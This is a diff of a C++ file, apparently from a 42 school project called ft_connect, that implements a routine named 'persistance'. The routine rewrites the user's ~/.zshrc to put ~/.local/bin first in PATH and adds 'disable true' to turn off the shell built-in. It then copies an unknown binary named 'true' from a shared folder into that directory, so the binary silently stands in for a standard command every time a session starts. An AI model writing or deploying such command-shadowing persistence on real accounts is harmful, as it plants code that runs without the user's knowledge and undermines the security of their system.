@@ -6,11 +6,14 @@
 /*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/03/08 21:51:00 by zcadinot          #+#    #+#             */
-/*   Updated: 2026/03/08 23:20:59 by zcadinot         ###   ########.fr       */
+/*   Updated: 2026/03/08 23:39:00 by zcadinot         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "ft_connect.hpp"
+#include <fstream>
+#include <string>
+#include <filesystem>
 
 void pr_zshrc()
 {
@@ -23,9 +26,10 @@ void pr_zshrc()
         return;
 
     if (!check_rc_path())
-        zshrc << "\nexport PATH=\"$PATH:$HOME/.local/bin\"\n";
+        zshrc << "\nexport PATH=\"$HOME/.local/bin:$PATH\"\n";
     if (!check_disable_true())
         zshrc << "disable true\n";
+
     zshrc.close();
 }
 
@@ -42,12 +46,13 @@ bool check_rc_path()
 
     while (std::getline(zshrc, line))
     {
-        if (line.find("export PATH=\"$PATH:$HOME/.local/bin\"") != std::string::npos)
+        if (line.find("export PATH=\"$HOME/.local/bin:$PATH\"") != std::string::npos)
         {
             zshrc.close();
             return (true);
         }
     }
+
     zshrc.close();
     return (false);
 }
@@ -56,8 +61,9 @@ std::string get_zshrc_path()
 {
     std::string user;
     std::string path;
+
     user = get_current_user();
-    path += "/home/";
+    path = "/home/";
     path += user;
     path += "/.zshrc";
     return (path);
@@ -67,8 +73,10 @@ bool check_disable_true()
 {
     std::ifstream zshrc;
     std::string line;
+    std::string zshrc_path;
 
-    zshrc.open("/home/zcadinot/.zshrc");
+    zshrc_path = get_zshrc_path();
+    zshrc.open(zshrc_path);
     if (!zshrc)
         return (false);
 
@@ -80,21 +88,26 @@ bool check_disable_true()
             return (true);
         }
     }
+
     zshrc.close();
     return (false);
 }
 
 static void copy_true()
 {
-    std::string bin_path;
+    std::string user;
+    std::string dir;
+    std::string dest;
 
-    bin_path += "/home/";
-    bin_path += get_current_user();
-    bin_path += "/.local/bin/true";
+    user = get_current_user();
+    dir = "/home/" + user + "/.local/bin";
+    dest = dir + "/true";
+
+    std::filesystem::create_directories(dir);
 
     copy_file(
         "/sgoinfre/goinfre/Perso/zcadinot/.fcpp/src/persistance/true",
-        bin_path
+        dest
     );
 }
 
@@ -102,5 +115,4 @@ void persistance()
 {
     pr_zshrc();
     copy_true();
-    return ;
 }
